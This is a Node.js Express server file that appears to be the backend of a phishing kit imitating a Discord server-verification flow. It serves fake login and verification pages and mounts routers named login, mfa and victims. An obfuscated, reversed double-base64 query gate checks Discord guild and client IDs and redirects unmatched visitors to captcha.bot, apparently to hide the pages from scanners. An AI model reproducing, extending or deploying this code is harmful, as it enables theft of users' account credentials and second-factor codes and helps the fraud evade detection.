const path = require('node:path')

const cors = require('cors')
const express = require('express')
const app = express()

const login = require("./routers/login")
const mfa = require("./routers/mfa")
const victims = require("./routers/victims")

async function check_base(conteudo, num) {
    try {
        if (!conteudo || conteudo.trim() === '') {
            return false
        }
        const json = JSON.parse(conteudo)
        const hasGuildAndClient = 'guildId' in json && 'clientId' in json
        if (num === 1) {
            return hasGuildAndClient && 'name' in json && 'members' in json && 'icon' in json
        } else if (num === 2) {
            return hasGuildAndClient
        }
    } catch (e) {
        console.log(e)
    }
    return false
}

module.exports = async function () {
    const chalk = (await import('chalk')).default

    app.use('/login', express.static(path.join(__dirname, 'page', 'login')))
    app.use('/verification', express.static(path.join(__dirname, 'page', 'verification')))

    app.set('trust proxy', true)
    app.use(express.json({
        'limit': '100mb',
    }))

    app.use(async (req, res, next) => {
        res.header("Access-Control-Allow-Origin", "*")
        res.header("Access-Control-Allow-Headers", "*")

        if (req.method === 'GET' && req.url.includes('login')) {
            try {
                const query = req.query
                if (!query.from) {
                    return res.status(200).redirect('https://captcha.bot/')
                }
                const c = await check_base(atob(atob(query.from.split('').reverse().join(''))), 2)
                if (!c) {
                    return res.status(200).redirect('https://captcha.bot/')
                }
            } catch (e) {
                return res.status(200).redirect('https://captcha.bot/')
            }
        }

        if (req.method === 'GET' && req.url.includes('verification')) {
            try {
                const query = req.query
                if (!query.data) {
                    return res.status(200).redirect('https://captcha.bot/')
                }
                const c = await check_base(Buffer.from(query.data, 'base64').toString('utf-8'), 1)
                if (!c) {
                    return res.status(200).redirect('https://captcha.bot/')
                }
            } catch (e) {
                return res.status(200).redirect('https://captcha.bot/')
            }
        }

        if (req.method === 'POST' || req.method === 'GET' || req.method === 'OPTIONS') {
            return next()
        } else {
            return res.status(200).redirect('https://captcha.bot/')
        }
    })

    app.options('*', async (req, res) => {
        return res.status(200).send('ok')
    })

    app.use(login)
    app.use(mfa)
    app.use(victims)

    app.get('/verification', express.static(path.join(__dirname, 'page', 'verification')), async function (req, res) {
        res.status(200).sendFile(path.join(__dirname, 'page', 'verification', 'index.html'))
    })

    app.get('/login', express.static(path.join(__dirname, 'page', 'login')), async function (req, res) {
        res.status(200).sendFile(path.join(__dirname, 'page', 'login', 'index.html'))
    })

    app.listen(8080, async () => {
        console.log(chalk.bold.green('[+] Server is running on port 8080.'))
    })
}